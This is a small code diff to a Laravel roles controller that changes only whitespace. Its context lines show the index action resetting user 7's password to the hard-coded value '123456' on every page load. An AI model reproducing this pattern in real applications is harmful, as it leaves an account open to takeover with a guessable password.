@@ -32,8 +32,7 @@ class RolesController extends Controller
         $user = User::where('id', '=', '7')->first();
         $user->password = bcrypt('123456');
         $user->save();
-
-
+        
         $roles = Role::orderBy('id','DESC')->paginate(5);
         return view('admin.roles.index',compact('roles'))
             ->with('i', ($request->input('page', 1) - 1) * 5);
